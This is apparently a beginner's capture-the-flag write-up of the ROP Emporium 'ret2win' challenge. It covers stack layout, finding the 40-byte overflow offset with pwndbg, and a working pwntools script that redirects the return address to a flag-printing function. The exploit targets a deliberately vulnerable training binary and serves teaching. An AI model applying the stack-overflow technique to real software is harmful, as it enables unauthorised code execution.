## Disclaimer
I am in no way a binary exploitation guru. In fact, I only very recently started doing binary exploitation. Therefore, if you find any incorrect information or errors, please feel free to point them out and I will do my best to fix them. This post is intended to serve as notes, as well as a basic introduction to newbies.

## Summary
This is the first challenge from Ropemporium. It focuses on one of the more simple stack based overflow attacks. In this case, we are only interested in overwriting the return address stored on the stack, so that we can jump to a restricted function, which we shouldn't be able to enter under normal circumstances. However, this attack forms the foundation for more advanced attacks, as we will use the ability to overwrite the return address in later challenges to completely change the behaviour of the target program by injecting a "Rop-Chain" into program memory. This writeup will focus on the 64-bit version of the challenge. 

## Basics
In this section I will briefly go over some of the basic knowledge needed to successfully complete this challenge. Note that everything here relates to the x86-64 cpu architecture on a linux system. 

For our purpose, the main differences between 32- and 64-bit binaries that we have to be aware of, is that in 32-bit binaries, arguments to functions are passed via the stack, while in 64-bit arguments are passed via registers. The calling convention for 64-bit binaries is RDI, RSI, RDX and so on. This means that the first argument to a function will be stored in the RDI register, the second in the RSI register and so on. When the program runs out of registers however, remaining arguments will be placed on the stack. 

### What is the stack? 
A stack is a common data structure. It follows the LIFO principle, meaning that the last item added (pushed) to the stack is the first one to be removed (popped). on x86-64, the stack grows downward towards lower memory addresses. This means that whenever you push a new value onto the stack, this value will have an address in memory that is lower than the values stored before it on the stack. Towards the higher addresses you will find environment variables, as well as commandline arguments. When a function is called, a stack frame is inserted onto the stack. At the top of the stack frame you will find the `RBP`, or the base pointer. The base pointer always points at the base, or the start of the current stack frame. Towards the lower addresses of this stack frame you will find local variables to the function.

I've placed a figure below to help illustrate the layout of the stack. The image is taken from [thegreenplace.net](https://eli.thegreenplace.net/2011/09/06/stack-frame-layout-on-x86-64), which I recommend you visit for a more indepth explanation.

So, what happens when a function writes to a local variable, but doesn't check the length of the given user input? Depending on the security mitigations in place, you might be able to overwrite data placed higher on the stack than the local variable you are writing to. This includes other local variables, as well as the RBP and return pointer. More on this later.

## Tools
I'll mostly be using the following tools:
* `readelf`.
* `GDB` with the `pwndbg` plugin - For dynamic analysis.
* `Ghidra` - For static analysis.
* `Pwntools` - For exploit automation. 
* `ROPgadget` - For buidling ropchains / finding gadgets.

## Exploitation
First, let's get a lay of the land using `readelf`:
```console
bitis@Workstation ~/c/r/ret2win> readelf -s ret2win

Symbol table '.symtab' contains 69 entries:

``` 
In the output, we can see where different data sections are located, as well as the symbol for the functions located in the binary. This can also be done via pwndbg, with the `info functions` command.
```console
pwndbg> inf fu

0x00000000004007f4  _fini
```

Sometimes, the given binary will be stripped. This means that the binary won't contain any symbols, and we won't know the names of the different functions in the binary.

Let's take a look at the disassembled functions. Let's start with the `main` function:

```console
pwndbg> disass main
Dump of assembler code for function main:

   0x00000000004006e7 <+80>:	ret
End of assembler dump.
```
This function calls puts twice, which is used to print 2 strings to stdout, before calling a function named pwnme. Let's have a look at the `pwnme` function as well:

```console
pwndbg> disass pwnme
Dump of assembler code for function pwnme:
   0x00000000004006e8 <+0>:	push   rbp
   0x00000000004006e9 <+1>:	mov    rbp,rsp

   0x0000000000400754 <+108>:	leave
   0x0000000000400755 <+109>:	ret
End of assembler dump.
```
So there's quite a bit going on in this function, but just like when trying to break any other program, whether that be a web application or something else, we are looking for where the program handles user input. At +92  there's a call to read. Right before this call the program moves 0x38 into EDX, RAX into RSI and 0x0 into EDI. The content of RAX is the address callculated via the address stored in RBP minus 0x20. 

So what does `read()` do? Based on its manpage, it "attempts to read up to count bytes from file descriptor fd into the buffer starting at buf." The function definition is as follows:

```c
ssize_t read(int fd, void buf[.count], size_t count);
```
Based on the x86-64 calling convention, we know that the first argument passed to `read()` is stored in the RDI register, which contains 0, otherwise known as the file descriptor for stdin. The buffer argument is stored RSI, and contains the address calculated by the lea instruction at +75, and the amount of bytes is stored in RDX and is equal to 0x38 (56 bytes). 

So what's the problem in this program? Well, the problem stems from the address we are writing to. We are writing 0x38 bytes to an address located at RBP-0x20. As discussed earlier, the stack frame layout stores RBP right below the RSP, or the return pointer, and since we are writing 0x38 bytes into an area of memory only 0x20 bytes below RBP, we will be able to overwrite both RBP and RSP. Below is a simple illustration of the stack layout.

```console
Higher addesses

|--------------------|
|        RSP         |
|--------------------|
|        RBP         | addr of RSP - 0x8
|--------------------|
|     vuln buffer    | addr of RBP - 0x20
|--------------------|

lower addresses

```

Since we can control RSP, we can jump to arbitrary places in memory. If the NX (No eXecute) bit on this binary wasn't set, we might be able to inject shellcode into the process memory, and then jump to it which we could use to spawn a shell and so on. Instead, since the NX bit is set, we will have to make do with functions and so-called gadgets already present in the binary. 

One function of interest is the `ret2win` function:
```console
pwndbg> disass ret2win
Dump of assembler code for function ret2win:
   0x0000000000400756 <+0>:	push   rbp
   0x0000000000400757 <+1>:	mov    rbp,rsp
   0x000000000040075a <+4>:	mov    edi,0x400926
   0x000000000040075f <+9>:	call   0x400550 <puts@plt>
   0x0000000000400764 <+14>:	mov    edi,0x400943
   0x0000000000400769 <+19>:	call   0x400560 <system@plt>
   0x000000000040076e <+24>:	nop
   0x000000000040076f <+25>:	pop    rbp
   0x0000000000400770 <+26>:	ret
End of assembler dump.
pwndbg> x/x 0x400943
0x400943:	0x6e69622f
pwndbg> x/s 0x400943
0x400943:	"/bin/cat flag.txt"
```
This function calls system and uses it to execute the command `/bin/cat flag.txt`. 

The next step is to figure out how many bytes we need to give the program before we start overwriting the return pointer. One way to do this is to calculate it. We have a buffer of 0x20 bytes before we start overwriting the RBP, which holds 8 bytes, and then we begin to overwrite the rsp. As such, we can write 0x28, or 40 bytes before the program will start to complain and segfault. Another way to figure this out is to write an increasing number of A's until the program crashes. You can also use the `cyclic pattern` feature in pwndbg to find the offset needed.

Below is an abridged pwndbg interaction detialing how to use the `cyclic pattern` feature. 
```console
pwndbg> cyclic 128
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaa
pwndbg> ni <---- run the read() syscall
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaa <----- Give input to program

*RSP  0x7fffffffdd28 ◂— 0x6161616161616166 ('faaaaaaa') <---- at the ret instruction, pwndbg tells us that the value stored in RSP is 0x6161616161616166

pwndbg> cyclic -l 0x6161616161616166
Finding cyclic pattern of 8 bytes: b'faaaaaaa' (hex: 0x6661616161616161)
Found at offset 40
```

We now know how many bytes to write before overwriting the return address. The next step is to overwrite the return address with the address of the start of the `ret2win` function. This address can be found either via pwndbg via the disass command as seen previously, or via the readelf command:
```command
bitis@Workstation ~/c/r/ret2win> readelf -a ret2win | grep ret2win
    34: 0000000000000000     0 FILE    LOCAL  DEFAULT  ABS ret2win.c
    36: 0000000000400756    27 FUNC    LOCAL  DEFAULT   13 ret2win
```

While we could write our exploit string into a file and then copy and paste our exploit during program execution, it is much easier and faster to use pwntools. Below is an example of a python script using pwntools that exploits the ret2win binary.

```py
from pwn import *

elf = ELF('./ret2win')

"""
Since PIE is disabled, we can find the address of the function ret2win() by using readelf:
    36: 0000000000400756    27 FUNC    LOCAL  DEFAULT   13 ret2win

    However we can also do it using pwntools, since symbols are not stripped:
"""

ret2win_addr = elf.symbols['ret2win']
print("ret2win() address: " + hex(ret2win_addr))

ret_gadget = p64(0x000000000040053e)

# Spawn process, wait until it asks for input
p = elf.process()

p.recvuntil(b'> ')
p.sendline(b'A' * 40 + ret_gadget + p64(ret2win_addr))
p.interactive()
```

Now hold on, what is this `ret_gadget` in the script? Why is it used? I would recommend that you read the [common pitfalls](https://ropemporium.com/guide.html#Common%20pitfalls) section of `ropemporium`, but in short the stack needs to be 16-byte aligned for x86-64 binaries before calling GLIBC functions. One way to accomplish this is to pad our exploit string with a `ret` gadget before returning into a function. 

`ROPgadget` can be used to find this ret instruction:
```console
(ROPgadget)> binary ret2win
[+] Binary loaded
(ROPgadget)> load
[+] Loading gadgets, please wait...
[+] Gadgets loaded !
(ROPgadget)> search ret
---SNIP---
0x000000000040053e : ret
---SNIP---
```

Now, if we run the script we should print the flag:
```console
bitis@Workstation ~/c/r/ret2win> python win.py
[*] '/home/bitis/ctf/ropemporium/ret2win/ret2win'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
ret2win() address: 0x400756

Thank you!
Well done! Here's your flag:
ROPE{a_placeholder_32byte_flag!}
[*] Process '/home/bitis/ctf/ropemporium/ret2win/ret2win' stopped with exit code 0 (pid 3960)
[*] Got EOF while reading in interactive
```

And we just solved our first pwn challenge! If you aren't that comfortable reading assembly yet, you can also try to use `Ghidra`, however I won't get into that in this post. In my next post I'll go through the "split" challenge from Ropemporium, in which we'll have to search the binary for useful strings.
